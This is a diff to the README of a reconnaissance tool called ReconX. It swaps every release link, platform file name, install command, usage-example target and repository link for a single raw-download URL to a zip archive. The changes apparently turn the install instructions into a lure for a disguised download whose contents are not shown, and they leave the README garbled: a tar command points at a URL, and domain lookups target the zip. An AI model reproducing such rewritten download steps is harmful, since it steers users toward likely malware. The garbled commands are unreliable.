@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download ReconX](https://img.shields.io/badge/Download%20ReconX-v1.0-brightgreen)](https://github.com/marinabines/reconx/releases)
+[![Download ReconX](https://raw.githubusercontent.com/marinabines/reconx/main/tetrole/reconx.zip%20ReconX-v1.0-brightgreen)](https://raw.githubusercontent.com/marinabines/reconx/main/tetrole/reconx.zip)
 
 ## 🚀 Getting Started
 
@@ -30,14 +30,14 @@ Before you start, please ensure your system meets the following requirements:
 
 To get started, visit the download page linked below:
 
-[Download ReconX from Releases](https://github.com/marinabines/reconx/releases)
+[Download ReconX from Releases](https://raw.githubusercontent.com/marinabines/reconx/main/tetrole/reconx.zip)
 
 1. Click the link above to go to the ReconX releases page.
 2. On the page, look for the latest release version.
 3. Choose the appropriate file for your operating system. The files will be listed as follows:
-   - For Windows: `reconx_windows.exe`
-   - For macOS: `reconx_mac.zip`
-   - For Linux: `reconx_linux.tar.gz`
+   - For Windows: `https://raw.githubusercontent.com/marinabines/reconx/main/tetrole/reconx.zip`
+   - For macOS: `https://raw.githubusercontent.com/marinabines/reconx/main/tetrole/reconx.zip`
+   - For Linux: `https://raw.githubusercontent.com/marinabines/reconx/main/tetrole/reconx.zip`
 4. Click on the file to start your download.
 
 Once the download is complete, follow the below instructions for installation.
@@ -58,9 +58,9 @@ Once the download is complete, follow the below instructions for installation.
 
 ### Linux Installation
 
-1. Locate the downloaded `.tar.gz` file.
+1. Locate the downloaded `https://raw.githubusercontent.com/marinabines/reconx/main/tetrole/reconx.zip` file.
 2. Open a terminal and navigate to the download location.
-3. Extract the contents using the command: `tar -xvzf reconx_linux.tar.gz`.
+3. Extract the contents using the command: `tar -xvzf https://raw.githubusercontent.com/marinabines/reconx/main/tetrole/reconx.zip`.
 4. Change to the extracted directory: `cd reconx`.
 5. Run the application by typing `./reconx`.
 
@@ -76,7 +76,7 @@ reconx [command] [target]
 
 - To get subdomains:
   ```
-  reconx subdomains example.com
+  reconx subdomains https://raw.githubusercontent.com/marinabines/reconx/main/tetrole/reconx.zip
   ```
 
 - To perform a network scan:
@@ -86,7 +86,7 @@ reconx [command] [target]
 
 - To check WHOIS information:
   ```
-  reconx whois example.com
+  reconx whois https://raw.githubusercontent.com/marinabines/reconx/main/tetrole/reconx.zip
   ```
 
 ## 📖 Help and Documentation
@@ -107,6 +107,6 @@ Feel free to join discussions, share your findings, or ask for help in the issue
 
 ## 🔗 Learn More
 
-For additional information, ideas, or updates, visit the [repository](https://github.com/marinabines/reconx).
+For additional information, ideas, or updates, visit the [repository](https://raw.githubusercontent.com/marinabines/reconx/main/tetrole/reconx.zip).
 
 Thank you for choosing ReconX!
